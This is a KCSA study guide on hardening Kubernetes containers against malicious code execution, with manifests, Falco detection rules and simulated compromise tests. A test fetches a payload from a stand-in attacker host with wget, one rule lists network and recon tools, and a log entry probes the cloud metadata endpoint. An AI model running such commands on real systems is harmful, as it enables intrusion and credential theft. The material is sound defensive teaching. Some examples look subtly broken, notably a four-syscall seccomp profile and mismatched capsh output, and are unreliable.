# KCSA Study Guide: Topic 4.4 — Malicious Code Execution and Compromised Applications in Containers

**Domain 4:** Container & Workload Security  
**Weight:** 2.29%  
**Target Level:** Senior SRE / Principal Platform Architect  

---

## 1. Motivation & Production Architectural Problem

### 1.1 Threat Landscape & Attack Vectors
In production Kubernetes environments, containerized applications are prime targets for arbitrary Remote Code Execution (RCE) attacks resulting from software vulnerabilities (e.g., Log4Shell, deserialization flaws, buffer overflows), compromised supply chain dependencies, or malicious base images. 

Once an attacker achieves code execution inside a container, they attempt post-exploitation tactics:
1. **Payload Persistence & Droppers:** Downloading second-stage malware (e.g., cryptominers, reverse shells, C2 agents) into writable directories such as `/tmp`, `/var/tmp`, or `/dev/shm`.
2. **Binary Hijacking & Webshell Injection:** Overwriting executable application binaries or modifying web server roots to establish persistent webshells.
3. **Privilege Escalation:** Exploiting setuid/setgid binaries, unhandled Linux kernel vulnerabilities (e.g., Dirty COW, Dirty Pipe), or residual Linux Capabilities (e.g., `CAP_SYS_ADMIN`, `CAP_NET_ADMIN`, `CAP_DAC_OVERRIDE`) to break out of the container boundary.
4. **Credential Harvesting:** Extracting automounted Kubernetes ServiceAccount tokens from `/var/run/secrets/kubernetes.io/serviceaccount/token` to interact directly with the Kubernetes API Server.
5. **Lateral Movement & Reconnaissance:** Utilizing pre-installed diagnostic utilities (`curl`, `nc`, `nmap`, `wget`, `bash`) to scan the internal Pod CIDR, node network, or Cloud Provider Metadata Endpoints (e.g., `169.254.169.254`).

```
+-----------------------------------------------------------------------------------+
| CONTAINER BOUNDARY (Pod / Namespace)                                              |
|                                                                                   |
|  [ RCE Vulnerability ] ---> [ Writable Root FS ] ---> [ Download/Execute Malware ] |
|                                       |                        |                  |
|                                       v                        v                  |
|                        [ ServiceAccount Token ]   [ Capability / Kernel Exploit ] |
|                                       |                        |                  |
+---------------------------------------|------------------------|------------------+
                                        v                        v
                            [ K8s API Server Access ]   [ Host Kernel / Node Breakout ]
```

### 1.2 Architectural Defense-in-Depth Principles
Mitigating malicious code execution requires enforcing immutability and minimal operational privileges at the runtime layer:
* **Root Filesystem Immutability:** Enforcing `readOnlyRootFilesystem: true` prevents attackers from writing payloads to disk, modifying binaries, or altering static configurations. Writable state must be restricted to ephemeral in-memory storage (`tmpfs`).
* **Non-Root & Privilege Boundary Enforcement:** Explicitly disabling root privileges (`runAsNonRoot: true`, `runAsUser: 10001`) and preventing privilege escalation (`allowPrivilegeEscalation: false`) invalidates setuid binaries and mitigates many kernel exploit pathways.
* **System Call & Capability Restriction:** Stripping all Linux capabilities (`capabilities: drop: ["ALL"]`) and applying restrictive Seccomp profiles (`RuntimeDefault` or custom profile) limits the host kernel surface area available to compromised processes.
* **Runtime Threat Detection:** Implementing eBPF-based behavioral monitoring (e.g., Falco) to analyze kernel syscall events (e.g., `execve`, `clone`, `openat`) in real-time, instantly alerting or blocking anomalous process executions (such as `sh` spawned inside a database pod).

---

## 2. Technical Comparison of Protection Primitives

| Security Primitive / Mechanism | Primary Security Objective | Production Performance Overhead | Developer / Operational Friction | Architectural Trade-Offs |
| :--- | :--- | :--- | :--- | :--- |
| **Immutability (`readOnlyRootFilesystem`)** | Prevents file persistence, binary modification, and malware dropping. | **Zero** overhead. | **High**: Applications writing logs/caches to disk fail unless explicit `tmpfs` mounts are defined. | Complete protection against local file modification; requires explicit application refactoring for state handling. |
| **Non-Root Execution (`runAsNonRoot`)** | Prevents execution as UID 0, mitigating container breakout vectors reliant on root privileges. | **Zero** overhead. | **Medium**: Base images using default root user require user creation (`USER 10001`) in Dockerfile. | Prevents binding to privileged ports (<1024) and accessing root-owned volume paths without proper GID mapping. |
| **Privilege Escalation Disablement (`allowPrivilegeEscalation: false`)** | Prevents `execve` from granting additional privileges via `setuid`/`setgid` binaries. | **Zero** overhead. | **Low**: Breaks specific tools reliant on `sudo` or `su` within the container. | Mandated by Pod Security Standards (Restricted); zero runtime cost for high mitigation value. |
| **Capability Dropping (`capabilities.drop: ["ALL"]`)** | Removes default Linux capabilities (e.g., `CAP_NET_RAW`, `CAP_MKNOD`, `CAP_CHOWN`). | **Zero** overhead. | **Medium**: Applications requiring network raw sockets or permission changes fail unless explicitly granted minimal needed capabilities. | Eliminates broad kernel subsystem exposure; requires auditing specific Linux capability requirements per workload. |
| **Seccomp Filtering (`RuntimeDefault`)** | Filters unauthorized Linux system calls (e.g., blocking `unshare`, `kexec_load`, `ptrace`). | **Negligible** (< 1% syscall filtering via eBPF/BPF filter). | **Low to Medium**: Custom profiles require detailed `strace`/eBPF profiling to avoid blocking valid application syscalls. | Drastically reduces Linux kernel vulnerability attack surface; `RuntimeDefault` provides standard protection with minimal application breakage. |
| **Runtime Behavioral Monitoring (Falco / eBPF)** | Detects post-exploitation activity (e.g., terminal spawned, unexpected binary execution). | **Low to Moderate** (1–3% CPU depending on syscall volume). | **Low**: Decoupled from application runtime; alerts managed by Security Operations / SRE. | Passive detection mechanism by default; requires active integration (e.g., Kubernetes response controller/SOAR) for immediate automated mitigation. |

---

## 3. Production Manifests and Infrastructure Configurations

### 3.1 Fully Hardened Workload Deployment (`hardened-deployment.yaml`)
This manifest enforces complete runtime immutability, privilege restriction, capability removal, seccomp filtering, and auto-mount disabling.

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: payment-gateway-api
  namespace: production-workloads
  labels:
    app.kubernetes.io/name: payment-gateway-api
    app.kubernetes.io/component: backend
    app.kubernetes.io/part-of: financial-system
    security.cncf.io/tier: hardened
spec:
  replicas: 3
  selector:
    matchLabels:
      app.kubernetes.io/name: payment-gateway-api
  template:
    metadata:
      labels:
        app.kubernetes.io/name: payment-gateway-api
    spec:
      # Block automatic injection of K8s API credentials unless explicitly required
      automountServiceAccountToken: false
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
        runAsGroup: 10001
        fsGroup: 10001
        seccompProfile:
          type: RuntimeDefault
      containers:
        - name: api-server
          image: registry.enterprise.io/finance/payment-api:v2.4.1
          imagePullPolicy: IfNotPresent
          command: ["/app/payment-service"]
          args: ["--config=/etc/app/config.yaml"]
          ports:
            - name: http-metrics
              containerPort: 8080
              protocol: TCP
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            runAsNonRoot: true
            runAsUser: 10001
            runAsGroup: 10001
            capabilities:
              drop:
                - ALL
          resources:
            limits:
              cpu: "500m"
              memory: "512Mi"
            requests:
              cpu: "100m"
              memory: "128Mi"
          volumeMounts:
            # Ephemeral in-memory storage for temporary application operations
            - name: tmp-dir
              mountPath: /tmp
            - name: cache-dir
              mountPath: /var/cache/app
            # Read-only configuration volume
            - name: config-volume
              mountPath: /etc/app
              readOnly: true
          readinessProbe:
            httpGet:
              path: /healthz
              port: 8080
            initialDelaySeconds: 5
            periodSeconds: 10
          livenessProbe:
            httpGet:
              path: /healthz
              port: 8080
            initialDelaySeconds: 15
            periodSeconds: 20
      volumes:
        - name: tmp-dir
          emptyDir:
            medium: Memory
            sizeLimit: 64Mi
        - name: cache-dir
          emptyDir:
            medium: Memory
            sizeLimit: 128Mi
        - name: config-volume
          configMap:
            name: payment-api-config
```

---

### 3.2 Runtime Threat Detection Rule Source (`falco-custom-rules.yaml`)
This configuration defines custom Falco rules in YAML format to detect compromised applications spawning unexpected shells, downloading tools, or executing unauthorized binaries.

```yaml
- rule: Terminal Shell Spawned in Production Container
  desc: Detects an interactive terminal shell (bash, sh, zsh, ksh) spawned inside a running production container.
  condition: >
    spawned_process and 
    container and 
    container.profile.name != "host" and 
    proc.name in (bash, sh, zsh, ksh, csh, tcsh, dash) and 
    not user.name in ("healthcheck")
  output: >
    CRITICAL: Terminal shell spawned in container 
    (user=%user.name user_loginuid=%user.loginuid pod=%k8s.pod.name ns=%k8s.ns.name 
    container=%container.name process=%proc.name parent=%proc.pname cmdline=%proc.cmdline 
    image=%container.image.repository:%container.image.tag)
  priority: CRITICAL
  tags: [container, process, kcsa, mitre_execution]

- rule: Execution of Known Malware/Recon Tools in Container
  desc: Detects execution of network scanning, file retrieval, or diagnostic binaries typically used by attackers.
  condition: >
    spawned_process and 
    container and 
    proc.name in (curl, wget, nc, netcat, nmap, socat, dig, nslookup, tcpdump, tshark, rawshark)
  output: >
    WARNING: Suspicious tool execution detected inside container 
    (pod=%k8s.pod.name ns=%k8s.ns.name process=%proc.name cmdline=%proc.cmdline 
    user=%user.name image=%container.image.repository)
  priority: WARNING
  tags: [container, network, kcsa, mitre_reconnaissance]

- rule: Write Executable Attempt on Ephemeral Memory
  desc: Detects creation or modification of executable files inside writable tmpfs mounts (/tmp or /var/tmp).
  condition: >
    open_write and 
    container and 
    (fd.name startswith /tmp/ or fd.name startswith /var/tmp/) and 
    (evt.arg.flags contains O_CREAT or evt.arg.flags contains O_TRUNC) and 
    proc.name != "payment-service"
  output: >
    ERROR: Unauthorized file write attempt in temporary directory 
    (pod=%k8s.pod.name ns=%k8s.ns.name file=%fd.name process=%proc.name cmdline=%proc.cmdline)
  priority: ERROR
  tags: [container, file, kcsa, mitre_persistence]
```

---

## 4. Real CLI Commands and Terminal Outputs

### 4.1 Deployment Verification and Immutability Testing
Deploy the workload and verify that the API Server applies the security context correctly.

```bash
$ kubectl apply -f hardened-deployment.yaml -n production-workloads
deployment.apps/payment-gateway-api created

$ kubectl get pods -n production-workloads -l app.kubernetes.io/name=payment-gateway-api
NAME                                   READY   STATUS    RESTARTS   AGE
payment-gateway-api-79b8c6696b-2k4l9   1/1     Running   0          14s
payment-gateway-api-79b8c6696b-8x9p1   1/1     Running   0          14s
payment-gateway-api-79b8c6696b-m5v7z   1/1     Running   0          14s
```

Inspect the effective runtime security context parameters on a live pod:

```bash
$ kubectl get pod payment-gateway-api-79b8c6696b-2k4l9 -n production-workloads -o jsonpath='{.spec.containers[0].securityContext}' | jq .
{
  "allowPrivilegeEscalation": false,
  "capabilities": {
    "drop": [
      "ALL"
    ]
  },
  "readOnlyRootFilesystem": true,
  "runAsGroup": 10001,
  "runAsNonRoot": true,
  "runAsUser": 10001
}
```

---

### 4.2 Simulating Compromise & Malicious Execution Attempts

#### Test Case A: Attempting file modification or payload deployment on root filesystem

```bash
$ kubectl exec -it payment-gateway-api-79b8c6696b-2k4l9 -n production-workloads -- touch /var/run/malware.sh
touch: cannot touch '/var/run/malware.sh': Read-only file system
command terminated with exit code 1
```

```bash
$ kubectl exec -it payment-gateway-api-79b8c6696b-2k4l9 -n production-workloads -- wget -P /app http://attacker.c2/payload
/app/payload: Read-only file system
command terminated with exit code 1
```

#### Test Case B: Attempting execution of setuid or privilege escalation binaries

```bash
$ kubectl exec -it payment-gateway-api-79b8c6696b-2k4l9 -n production-workloads -- id
uid=10001(appuser) gid=10001(appgroup) groups=10001(appgroup)
```

```bash
$ kubectl exec -it payment-gateway-api-79b8c6696b-2k4l9 -n production-workloads -- capsh --print
Current: =
Bounding set =
Securebits: 00/0x0/1/16b (secure-noroot; secure-no-suid-fixup)
 secure-noroot: yes (locked)
 secure-no-suid-fixup: yes (locked)
 secure-keep-caps: no (locked)
uid=10001(appuser) euid=10001(appgroup)
```

#### Test Case C: Accessing ServiceAccount API Token when `automountServiceAccountToken: false`

```bash
$ kubectl exec -it payment-gateway-api-79b8c6696b-2k4l9 -n production-workloads -- ls -la /var/run/secrets/kubernetes.io/serviceaccount
ls: /var/run/secrets/kubernetes.io/serviceaccount: No such file or directory
command terminated with exit code 2
```

---

### 4.3 Runtime Threat Alert Generation (Falco Log Output)
When an unauthorized process execution bypasses binary restrictions or an interactive shell is invoked via `kubectl exec`, Falco captures the kernel `execve` event and emits structured log output.

```bash
$ kubectl logs -n falco-system -l app.kubernetes.io/name=falco --tail=5
{"hostname":"node-prod-worker-03","level":"critical","output":"18:22:04.391823901: CRITICAL Terminal shell spawned in container (user=appuser user_loginuid=-1 pod=payment-gateway-api-79b8c6696b-2k4l9 ns=production-workloads container=api-server process=sh parent=containerd-shim cmdline=sh image=registry.enterprise.io/finance/payment-api:v2.4.1)","priority":"Critical","rule":"Terminal Shell Spawned in Production Container","time":"2026-08-07T18:22:04.391823901Z"}
{"hostname":"node-prod-worker-03","level":"warning","output":"18:22:15.892019482: WARNING Suspicious tool execution detected inside container (pod=payment-gateway-api-79b8c6696b-2k4l9 ns=production-workloads process=curl cmdline=curl -s http://169.254.169.254/latest/meta-data/ user=appuser image=registry.enterprise.io/finance/payment-api:v2.4.1)","priority":"Warning","rule":"Execution of Known Malware/Recon Tools in Container","time":"2026-08-07T18:22:15.892019482Z"}
```

---

## 5. Failure Verification and Troubleshooting Guide

### 5.1 Diagnostic Matrix for Security-Induced Workload Failures

```
+-----------------------------------------------------------------------------------+
| POD CRASH / DEPLOYMENT FAILURE                                                    |
+-----------------------------------------------------------------------------------+
                                         |
                       +-----------------+-----------------+
                       |                                   |
                       v                                   v
          [ Exit Code 1 / Error Logs ]            [ Exit Code 159 / SIGSYS ]
                       |                                   |
             +---------+---------+                         v
             |                   |               [ Seccomp Syscall Block ]
             v                   v                         |
  [ Read-only Filesystem ]  [ Permission Denied ]          v
             |                   |                 [ Audit Kernel Logs ]
             v                   v                         |
     [ Add tmpfs Volume ]  [ Capability / UID ]            v
                                                   [ Adjust Profile ]
```

| Symptom / Error | Root Cause Analysis | Remediation Protocol |
| :--- | :--- | :--- |
| **Pod Status:** `CrashLoopBackOff`<br>**Log:** `open /var/log/app.log: read-only file system` | Application code attempts to write log/pid/cache files to root filesystem with `readOnlyRootFilesystem: true`. | Mount an `emptyDir` (preferably `medium: Memory`) at `/var/log` or redirect application output exclusively to `stdout`/`stderr`. |
| **Pod Status:** `CrashLoopBackOff`<br>**Log:** `bind: permission denied` (Port < 1024) | Application compiled to listen on port 80/443 fails under `runAsNonRoot: true` and missing `CAP_NET_BIND_SERVICE`. | Reconfigure application to listen on non-privileged ports (e.g., 8080/8443) or add only `CAP_NET_BIND_SERVICE` capability. |
| **Pod Status:** `Error`<br>**Termination Signal:** `SIGSYS` (Exit code 159) | Application executed a system call blocked by the active `seccomp` profile (`RuntimeDefault` or custom). | Profile application syscalls using eBPF/`strace` to identify the blocked syscall and update custom seccomp profile. |
| **Pod Status:** `CreateContainerConfigError`<br>**Message:** `container has runAsNonRoot and image will run as root` | Dockerfile lacks `USER` instruction, defaulting to UID 0, which violates Pod `runAsNonRoot: true`. | Update Dockerfile with `USER 10001:10001` or set `spec.containers[*].securityContext.runAsUser: 10001` in the manifest. |

---

### 5.2 Step-by-Step Seccomp & Syscall Troubleshooting Workflow

When a hardened pod crashes with exit status `159` (`SIGSYS`), the Linux kernel killed the process due to a seccomp policy violation.

#### Step 1: Identify the Affected Pod and Host Node
```bash
$ kubectl get pod payment-gateway-api-79b8c6696b-2k4l9 -n production-workloads -o wide
NAME                                   READY   STATUS   RESTARTS   NODE
payment-gateway-api-79b8c6696b-2k4l9   0/1     Error    3          node-prod-worker-03
```

#### Step 2: Query Host Audit Logs for Blocked Syscalls
Execute host audit log inspection on node `node-prod-worker-03`:

```bash
$ dmesg -T | grep -i seccomp
[Fri Aug  7 18:35:12 2026] audit: type=1326 audit(1754591712.401:912): auid=4294967295 uid=10001 gid=10001 ses=4294967295 pid=84912 comm="payment-service" exe="/app/payment-service" sig=31 arch=c000003e syscall=303 compat=0 ip=0x7f9a123b41a0 code=0x0
```

*Note: `syscall=303` corresponds to `name_to_handle_at` on x86_64 (`arch=c000003e`).*

Alternatively, inspect system audit logs via `journalctl`:

```bash
$ journalctl -k --grep="SECCOMP" --no-pager -n 5
Aug 07 18:35:12 node-prod-worker-03 kernel: audit: type=1326 audit(1754591712.401:912): auid=4294967295 uid=10001 gid=10001 pid=84912 comm="payment-service" sig=31 syscall=303 code=0x0
```

#### Step 3: Map System Call Number to Name
Convert syscall architecture ID and number using `ausyscall`:

```bash
$ ausyscall x86_64 303
name_to_handle_at
```

#### Step 4: Remediate Policy Definition
Update the custom Seccomp profile JSON file stored on the worker node (`/var/lib/kubelet/seccomp/profiles/custom-payment.json`) to allow the identified syscall under the specific action group:

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": [
    "SCMP_ARCH_X86_64"
  ],
  "syscalls": [
    {
      "names": [
        "clone",
        "execve",
        "exit_group",
        "name_to_handle_at"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

Apply the profile update in the pod spec:

```yaml
securityContext:
  seccompProfile:
    type: Localhost
    localhostProfile: profiles/custom-payment.json
```

---

## 6. References

* **CNCF KCSA Curriculum (Official Specification):**  
  https://github.com/cncf/curriculum/raw/master/KCSA%20Curriculum.pdf

* **Kubernetes Documentation — Configure a Security Context for a Pod or Container:**  
  https://kubernetes.io/docs/tasks/configure-pod-container/security-context/

* **Kubernetes Documentation — Restrict a Container's Access to Resources with Seccomp:**  
  https://kubernetes.io/docs/tutorials/security/seccomp/

* **Kubernetes Documentation — Pod Security Standards (Restricted Profile):**  
  https://kubernetes.io/docs/concepts/security/pod-security-standards/#restricted

* **Falco Security Documentation — Official Threat Detection Rules Architecture:**  
  https://falco.org/docs/rules/

* **OWASP Container Security Verification Standard (CSVS):**  
  https://owasp.org/www-project-container-security-verification-standard/